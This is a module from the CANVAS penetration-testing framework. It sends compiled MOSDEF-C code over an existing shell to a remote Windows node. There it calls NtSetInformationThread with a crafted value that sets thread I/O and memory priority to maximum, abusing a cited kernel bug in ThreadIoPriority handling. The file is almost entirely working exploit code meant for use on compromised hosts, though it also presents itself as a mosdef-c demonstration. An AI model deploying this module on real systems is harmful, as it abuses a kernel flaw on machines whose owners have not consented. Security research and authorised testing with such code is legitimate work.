#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2013
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")


from localNode          import localNode
from ExploitTypes.localcommand import LocalCommand

NAME                        = "threadio"
DESCRIPTION                 = "Set thread I/O and memory priority to max"
VERSION                     = "0.1"
GTK2_DIALOG                 = "dialog.glade2"
DOCUMENTATION               = {}
DOCUMENTATION["References"] = "http://waleedassar.blogspot.com/2013/02/kernel-bug-0-threadiopriority.html"
DOCUMENTATION["Notes"]      = """

Tested on Win7 x86 and x64.

A module to demonstrate mosdef-c, if you're looking to pass simple values (int) 
back from the host this is a good demonstration

It will attempt to set a thread's I/O and memory priority to the maximum assignable values

"""

PROPERTY               = {}
PROPERTY['SITE']       = "Local"
PROPERTY['TYPE']       = "Commands"
PROPERTY['ARCH']       = [ ["Windows"] ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.name           = NAME       

    def abort(self):
        self.setInfo("%s - Done (failed)"%(NAME))
        return 0
        
    def run(self):
        self.setInfo("%s (in progress)" % (NAME))

        node     = self.argsDict['passednodes'][0]
        type     = node.nodetype.lower()
        nodename = node.getname()

        if isinstance(node, localNode):
            self.log('Node of type %s not supported.' % type)
            return 0
            
        if type not in ['win32node', 'win64node']:
            self.log('Node of type %s not supported yet.' % type)
            return 0

        code = """
        #import "REMOTE", "ntdll.dll|NtSetInformationThread"   as "NtSetInformationThread"
        #import "REMOTE", "ntdll.dll|NtQueryInformationThread" as "NtQueryInformationThread"
        #import "REMOTE", "kernel32.dll|GetCurrentThread"      as "GetCurrentThread"
        #import "REMOTE", "kernel32.dll|GetCurrentThreadId"    as "GetCurrentThreadId"
        
        #import "local", "sendint" as "sendint"
        """

        if type == 'win32node':
            code = code.replace("REMOTE", "remote")
        else:
            code = code.replace("REMOTE", "local")
        

        code += """
        void main() {
            int success;
            int threadId;
            int setResult;
            int queryResult;
            unsigned long p1;
            unsigned long p2;

            success = 42;
            p1 = 0xFF3FFF3C;
            p2 = 0;
            
            threadId = GetCurrentThreadId();
            sendint(threadId);
            
            setResult = NtSetInformationThread(GetCurrentThread(), 0x16, &p1, 4);
            sendint(setResult);
            queryResult = NtQueryInformationThread(GetCurrentThread(),0x16, &p2,4,0);
            sendint(queryResult);
            sendint(success);
        }
        """
        
        # Compile the code and ship it over
        vars = {}
        node.shell.clearfunctioncache()
        request = node.shell.compile(code, vars)
        node.shell.sendrequest(request)
        
        # Handle the responses
        threadId = node.shell.readint(signed=True)     # recv threadId
        setResult = node.shell.readint(signed=False)   # recv NtQueryInformationThread result 
        queryResult = node.shell.readint(signed=False) # recv new thread priority
        success = node.shell.readint(signed=True)      # recv success, not strictly needed
        
        node.shell.leave()
        
        # Lets have some verbose error handling
        if threadId == 0:
            self.log("Unable to get current thread ID, this will likely fail")
            
        if setResult != 0:
            self.log("Received an error when attempting to call NtSetInformationThread")
            self.log("Error no: 0x%x" % setResult)
            self.log("Check here for error details: http://msdn.microsoft.com/en-us/library/cc704588.aspx")
            return self.abort()
            
        if queryResult != 0:
            self.log("Error when attemping to call NtQueryInformationThread, the module may have worked but unable to confirm")
            return self.abort()
            
        if success != 42:
            self.log("Encountered an error before the module exited")
            return self.abort()
                
        self.log("Thread Id: 0x%x" % threadId)
        self.log("NtSetinformationThread: 0x%x" % setResult)
        self.log("NtQueryInformationThread: 0x%x" % queryResult)
        self.log("Success: %d" % success)
        
        self.setInfo("%s - Done (success)"%(NAME))
        return 1
